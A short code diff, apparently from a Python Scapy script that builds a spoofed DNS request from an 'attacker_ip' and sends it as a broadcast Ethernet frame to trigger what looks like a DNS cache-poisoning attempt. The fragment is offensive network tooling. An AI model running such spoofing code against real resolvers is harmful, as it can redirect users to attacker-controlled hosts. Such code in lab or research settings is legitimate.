@@ -60,10 +60,11 @@ while True:
         all_pkts.append(bytes(pkt))
     
     trigger = build_spoofed_dns_request(attacker_ip, 12345, 53, domain, "A")
-    struct.pack_into('!H', raw_bytes, 42, 0)
+    l2_trigger = Ether(dst="ff:ff:ff:ff:ff:ff") / trigger
+    raw_trigger = raw(l2_trigger)
+
+    s.send(raw_trigger)
     start = time.time()
-    s.send(raw_bytes)
-    
     
     #s.send(raw(trigger))
     #send(trigger, verbose=0)
